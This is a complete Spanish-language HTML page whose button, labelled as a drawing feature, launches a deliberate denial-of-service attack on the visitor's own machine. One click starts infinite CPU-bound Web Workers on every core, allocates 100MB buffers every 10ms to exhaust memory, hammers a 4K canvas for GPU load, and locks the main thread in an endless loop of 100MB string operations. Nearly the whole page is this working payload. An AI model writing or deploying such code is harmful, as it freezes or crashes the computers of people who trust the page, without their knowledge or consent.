<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>HiperBotón Peligroso</title>
  <style>
    html,body{margin:0;height:100%;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;align-items:center;justify-content:center}
    button{padding:2rem 4rem;font-size:2rem;background:#c00;color:#fff;border:none;border-radius:12px;cursor:pointer;transition:transform .1s}
    button:hover{transform:scale(1.1)}
    canvas{margin-top:2rem;border:3px solid #0f0;display:none}
  </style>
</head>
<body>
  <button id="detonate">Dibuja (peor que nunca)</button>
  <canvas id="canvas" width="3840" height="2160"></canvas>

  <script>
    const btn=document.getElementById('detonate');
    const canvas=document.getElementById('canvas');
    const ctx=canvas.getContext('2d');

    btn.addEventListener('click',()=>{
      btn.style.display='none';
      canvas.style.display='block';

      // Crear múltiples workers para maximizar uso de CPU
      const workers = [];
      const numWorkers = navigator.hardwareConcurrency || 8;

      for(let i = 0; i < numWorkers; i++) {
        const blob = new Blob([`
          self.onmessage = function() {
            // Bucle infinito pesado
            while(true) {
              // Operaciones pesadas
              const arr = new ArrayBuffer(1024*1024*10); // 10MB por iteración
              const view = new Uint8Array(arr);
              for(let j = 0; j < view.length; j++) {
                view[j] = Math.random() * 256;
              }
              // Cálculos pesados
              let result = 0;
              for(let k = 0; k < 1e6; k++) {
                result += Math.sqrt(Math.random()) * Math.sin(Math.random());
              }
            }
          };
        `], { type: 'application/javascript' });
        
        const worker = new Worker(URL.createObjectURL(blob));
        worker.postMessage('start');
        workers.push(worker);
      }

      // Consumir toda la memoria RAM disponible
      const memoryHog = [];
      const interval = setInterval(() => {
        // Crear arrays masivos
        memoryHog.push(new ArrayBuffer(100 * 1024 * 1024)); // 100MB cada 10ms
        // Dibujar en canvas para forzar GPU
        ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
        ctx.fillRect(
          Math.random()*canvas.width,
          Math.random()*canvas.height,
          100, 100
        );
      }, 10);

      // Bloquear el hilo principal también
      while(true) {
        // Operación síncrona bloqueante
        const hugeString = 'x'.repeat(1024*1024*100); // 100MB string
        const reversed = hugeString.split('').reverse().join('');
        // Forzar recolección de basura
        globalThis.hugeString = reversed;
      }
    });
  </script>
</body>
</html>
